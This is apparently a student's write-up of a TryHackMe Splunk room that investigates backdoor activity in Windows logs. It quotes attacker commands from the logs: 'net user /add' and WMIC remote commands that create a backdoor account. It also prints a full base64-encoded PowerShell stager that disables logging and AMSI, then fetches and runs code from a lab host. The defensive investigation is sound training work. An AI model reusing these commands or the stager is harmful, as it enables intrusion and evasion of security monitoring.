---
Investigate anomalies using Splunk.
---

### Investigating with Splunk

SOC Analyst **Johny** has observed some anomalous behaviours in the logs of a few windows machines. It looks like the adversary has access to some of these machines and successfully created some backdoor. His manager has asked him to pull those logs from suspected hosts and ingest them into Splunk for quick investigation. Our task as SOC Analyst is to examine the logs and identify the anomalies.

To learn more about Splunk and how to investigate the logs, look at the rooms [splunk101](https://tryhackme.com/room/splunk101) and [splunk201](https://tryhackme.com/room/splunk201).

Room Machine

Before moving forward, deploy the machine. When you deploy the machine, it will be assigned an IP **Machine IP**: `MACHINE_IP`. You can visit this IP from the VPN or the Attackbox. The machine will take up to 3-5 minutes to start. All the required logs are ingested in the index **main.**

Answer the questions below

How many events were collected and Ingested in the index **main**?  

![[Pasted image 20221215111956.png]]

*12256*

On one of the infected hosts, the adversary was successful in creating a backdoor user. What is the new username?  

Narrow down based on Event ID

![[Pasted image 20221215113349.png]]

```
 @version: 1
   AccountName: SYSTEM
   AccountType: User
   Category: Process Create (rule: ProcessCreate)
   Channel: Microsoft-Windows-Sysmon/Operational
   CommandLine: C:\windows\system32\net1 user /add A1berto paw0rd1
   Company: Microsoft Corporation
   CurrentDirectory: C:\windows\system32\
   Description: Net Command
   Domain: NT AUTHORITY
   EventID: 1
   EventReceivedTime: 2022-02-14 08:06:02
   EventTime: 2022-02-14 08:06:02
   EventType: INFO
   ExecutionProcessID: 3348
   FileVersion: 10.0.18362.997 (WinBuild.160101.0800)
   Hashes: SHA1=F926F9421606D1AAADAF798DB2B3A0BD3009A2C3,MD5=3315CF38117D3CCBAC0B40EECC633FBB,SHA256=195A557E92A631E29ECF789C360A99C0F5D2D1BECEA33153CCA60E63D04CEE01,IMPHASH=D115CDECBD7EB553182EAD3D45F5816C
   Hostname: Micheal.Beaven
   Image: C:\Windows\System32\net1.exe
   IntegrityLevel: High
   Keywords: -9223372036854776000
   LogonGuid: {83d0c8c3-5caa-5f5f-8616-550000000000}
   LogonId: 0x551686
   Message: Process Create:
RuleName: -
UtcTime: 2022-02-14 12:06:02.404
ProcessGuid: {83d0c8c3-5caa-5f5f-f302-000000000400}
ProcessId: 3692
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.18362.997 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\windows\system32\net1 user /add A1berto paw0rd1
CurrentDirectory: C:\windows\system32\
User: Cybertees\James
LogonGuid: {83d0c8c3-5caa-5f5f-8616-550000000000}
LogonId: 0x551686
TerminalSessionId: 0
IntegrityLevel: High
Hashes: SHA1=F926F9421606D1AAADAF798DB2B3A0BD3009A2C3,MD5=3315CF38117D3CCBAC0B40EECC633FBB,SHA256=195A557E92A631E29ECF789C360A99C0F5D2D1BECEA33153CCA60E63D04CEE01,IMPHASH=D115CDECBD7EB553182EAD3D45F5816C
ParentProcessGuid: {83d0c8c3-5caa-5f5f-f102-000000000400}
ParentProcessId: 7768
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net user /add A1berto paw0rd1
   Opcode: Info
   OpcodeValue: 0
   OriginalFileName: net1.exe
   ParentCommandLine: net user /add A1berto paw0rd1
   ParentImage: C:\Windows\System32\net.exe
   ParentProcessGuid: {83d0c8c3-5caa-5f5f-f102-000000000400}
   ParentProcessId: 7768
   ProcessGuid: {83d0c8c3-5caa-5f5f-f302-000000000400}
   ProcessId: 3692
   Product: Microsoft® Windows® Operating System
   ProviderGuid: {5770385F-C22A-43E0-BF4C-06F5698FFBD9}
   RecordNumber: 183176
   RuleName: -
   Severity: INFO
   SeverityValue: 2
   SourceModuleName: eventlog
   SourceModuleType: im_msvistalog
   SourceName: Microsoft-Windows-Sysmon
   Task: 1
   TerminalSessionId: 0
   ThreadID: 4532
   User: Cybertees\James
   UserID: S-1-5-18
   UtcTime: 2022-02-14 12:06:02.404
   Version: 5
   host: cybertees.net
   port: 60427
   tags: [ [+]
   ]
   timestamp: 2022-02-14T12:06:02.836Z
}
```

![[Pasted image 20221215113443.png]]

index="main" "Net User"

I see 
https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4720

index="main" EventID=4720

![[Pasted image 20221215114300.png]]

*A1berto*


On the same host, a registry key was also updated regarding the new backdoor user. What is the full path of that registry key?

index="main" A1berto registry
	
	*HKLM\SAM\SAM\Domains\Account\Users\Names\A1berto *

Examine the logs and identify the user that the adversary was trying to impersonate.  

index="main"

![[Pasted image 20221215120806.png]]

*Alberto*

What is the command used to add a backdoor user from a remote computer?  

index="main" A1berto

![[Pasted image 20221215120943.png]]

	
	*"C:\windows\System32\Wbem\WMIC.exe" /node:WORKSTATION6 process call create "net user /add A1berto paw0rd1"*

How many times was the login attempt from the backdoor user observed during the investigation?  

	index=main Category="*"| rare limit=40 Category

![[Pasted image 20221215121732.png]]


index=main Category=Logon A1berto

![[Pasted image 20221215121811.png]]

*0*

What is the name of the infected host on which suspicious Powershell commands were executed?

index=main powershell

or

index=main A1berto Channel="Windows PowerShell"

![[Pasted image 20221215121855.png]]

*James.Browne*

PowerShell logging is enabled on this device. How many events were logged for the malicious PowerShell execution?

Verifying powershell logging with splunk
https://docs.splunk.com/Documentation/UBA/5.1.0.1/GetDataIn/AddPowerShell

index=main EventID=4103

*79*

An encoded Powershell script from the infected host initiated a web request. What is the full URL?

Defang the URL, Cyberchef can help with this.

```
HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBJAG8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBJAE8ATgAuAE0AYQBKAE8AUgAgAC0ARwBlACAAMwApAHsAJAAxADEAQgBEADgAPQBbAHIAZQBGAF0ALgBBAFMAcwBlAE0AYgBsAHkALgBHAGUAdABUAHkAUABFACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAFQARgBJAGUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQAMQAxAEIAZAA4ACkAewAkAEEAMQA4AEUAMQA9ACQAMQAxAEIARAA4AC4ARwBlAHQAVgBhAEwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkAEEAMQA4AGUAMQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABhADEAOABlADEAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AEEATAA9AFsAQwBvAEwAbABlAGMAdABpAE8ATgBTAC4ARwBlAE4ARQByAGkAQwAuAEQASQBjAFQAaQBPAG4AQQBSAFkAWwBTAHQAcgBJAE4ARwAsAFMAeQBzAFQARQBtAC4ATwBCAEoARQBjAHQAXQBdADoAOgBuAGUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAFYAQQBMAC4AQQBkAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAYQAxADgAZQAxAFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAFYAQQBsAH0ARQBMAHMARQB7AFsAUwBjAFIAaQBwAFQAQgBsAE8AQwBLAF0ALgAiAEcAZQBUAEYASQBFAGAATABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbABVAGUAKAAkAE4AdQBMAEwALAAoAE4ARQB3AC0ATwBCAGoAZQBDAHQAIABDAG8ATABMAEUAYwBUAGkATwBOAFMALgBHAGUATgBlAHIASQBjAC4ASABBAHMASABTAGUAdABbAFMAVAByAGkAbgBnAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAGYAXQAuAEEAcwBTAEUATQBCAGwAeQAuAEcAZQBUAFQAeQBQAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBmAC4ARwBFAHQARgBJAGUATABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEATAB1AGUAKAAkAE4AVQBMAGwALAAkAHQAUgBVAGUAKQA7AH0AOwBbAFMAWQBTAHQARQBtAC4ATgBlAFQALgBTAGUAcgB2AEkAQwBlAFAAbwBJAE4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAWABwAGUAQwBUADEAMAAwAEMAbwBuAHQASQBOAHUAZQA9ADAAOwAkADcAYQA2AGUARAA9AE4AZQBXAC0ATwBCAEoAZQBDAFQAIABTAFkAcwB0AGUATQAuAE4AZQB0AC4AVwBFAGIAQwBsAEkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQAZQBYAFQALgBFAE4AQwBvAGQAaQBOAEcAXQA6ADoAVQBuAGkAYwBvAGQARQAuAEcAZQB0AFMAdAByAGkATgBHACgAWwBDAG8ATgBWAGUAUgBUAF0AOgA6AEYAcgBvAE0AQgBBAFMAZQA2ADQAUwB0AFIASQBuAEcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEEAPQA9ACcAKQApACkAOwAkAHQAPQAnAC8AbgBlAHcAcwAuAHAAaABwACcAOwAkADcAQQA2AEUAZAAuAEgARQBBAGQAZQByAHMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADcAYQA2AEUAZAAuAFAAUgBPAHgAWQA9AFsAUwB5AFMAVABFAG0ALgBOAEUAVAAuAFcAZQBiAFIARQBRAFUAZQBzAFQAXQA6ADoARABlAGYAQQBVAEwAdABXAGUAQgBQAFIAbwBYAFkAOwAkADcAYQA2AEUARAAuAFAAUgBPAFgAWQAuAEMAUgBlAGQARQBuAHQASQBBAGwAUwAgAD0AIABbAFMAWQBzAFQARQBNAC4ATgBFAHQALgBDAFIAZQBkAEUAbgBUAEkAYQBMAEMAYQBjAGgARQBdADoAOgBEAEUARgBhAFUAbAB0AE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AdABJAEEATABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADcAYQA2AGUAZAAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABlAE0ALgBUAGUAWABUAC4ARQBuAEMAbwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQBUAGUAUwAoACcAcQBtAC4AQAApADUAeQA/AFgAeAB1AFMAQQAtAD0AVgBEADQANgA3ACoAfABPAEwAVwBCAH4AcgBuADgAXgBJACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBzADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAFUAbgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAEIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQANwBBADYAZQBkAC4ASABlAEEARABlAHIAcwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBLAHUAVQB6AHUAaQBkAD0AVgBtAGUASwBWADUAZABlAGsAZwA5AHkANwBrAC8AdABsAEYARgBBADgAYgAyAEEAYQBJAHMAPQAiACkAOwAkAEQAYQB0AGEAPQAkADcAYQA2AGUAZAAuAEQAbwB3AE4ATABvAGEAZABEAGEAdABBACgAJABTAEUAcgArACQAdAApADsAJABpAHYAPQAkAEQAQQBUAEEAWwAwAC4ALgAzAF0AOwAkAEQAYQBUAEEAPQAkAGQAQQBUAEEAWwA0AC4ALgAkAEQAYQBUAEEALgBMAEUAbgBHAHQASABdADsALQBKAE8AaQBOAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAQQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==

using cyberchef (from base64, remove null byte, whitespace)

aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==
http://10.10.10.5

using virustotal
https://www.virustotal.com/gui/ip-address/10.10.10.5/relations
it's not shell.php 

it was encoded 😂

UnicodE.GetStriNG([CoNVeRT]::FroMBASe64StRInG('aAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADAALgA1AA==')));$t='/news.php';$7A6Ed.HEAders.Add('User-Agent',$u)

---
another way (from base64, decode text UTF-16LE)
---

so finally is: http://10.10.10.5/news.php

now defanging url

hxxp[://]10[.]10[.]10[.]5/news[.]php

```

![[Pasted image 20221215123443.png]]

	*hxxp[://]10[.]10[.]10[.]5/news[.]php*




[[Incident handling with Splunk]]
